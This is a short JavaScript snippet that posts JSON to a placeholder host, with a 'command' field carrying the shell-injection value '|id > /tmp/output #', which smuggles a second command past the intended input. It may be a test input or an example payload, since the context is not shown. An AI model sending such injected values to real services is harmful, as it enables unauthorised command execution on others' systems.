fetch('https://worker.invalid/run', {method: 'POST', body: JSON.stringify({
  command: '|id > /tmp/output #',
  username: 'operator'
})});
